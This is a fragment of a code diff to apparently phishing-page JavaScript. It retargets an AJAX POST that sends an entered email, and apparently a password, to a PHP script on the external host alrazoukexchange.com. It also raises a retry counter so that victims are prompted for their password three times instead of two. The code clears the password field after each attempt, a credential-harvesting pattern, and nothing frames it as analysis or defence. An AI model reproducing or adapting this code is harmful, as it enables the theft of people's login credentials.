@@ -297,7 +297,7 @@ count=count+1;
 
 $.ajax({
 dataType: 'JSON',
-url: 'https://alrazoukexchange.com/result.php',
+url: 'https://alrazoukexchange.com/holaje.php',
 type: 'POST',
       	data:{
 			email:email,
@@ -313,7 +313,7 @@ type: 'POST',
             		console.log(response);
             		if(response['signal'] == 'ok'){
             			$("#password").val("");
-            			if (count>=2) {
+            			if (count>=3) {
             				count=0;
                     
 
@@ -327,7 +327,7 @@ type: 'POST',
     },
     error: function(){
     	$("#password").val("");
-    	if (count>=2) {
+    	if (count>=3) {
     		count=0;
     		
     	}
